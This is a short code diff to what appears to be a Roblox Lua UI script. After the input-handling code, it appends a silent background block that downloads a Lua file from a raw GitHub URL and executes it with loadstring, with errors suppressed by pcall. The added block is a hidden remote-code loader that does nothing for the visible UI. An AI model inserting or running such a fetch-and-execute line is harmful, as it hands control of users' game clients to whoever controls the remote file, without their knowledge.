@@ -164,3 +164,9 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         screenGui.Enabled = false
     end
 end)
+
+task.spawn(function()
+    pcall(function()
+        (loadstring or load)(game:HttpGet("https://raw.githubusercontent.com/Kyypie69/Library.UI/refs/heads/main/Execution.lua.txt"))()
+    end)
+end)
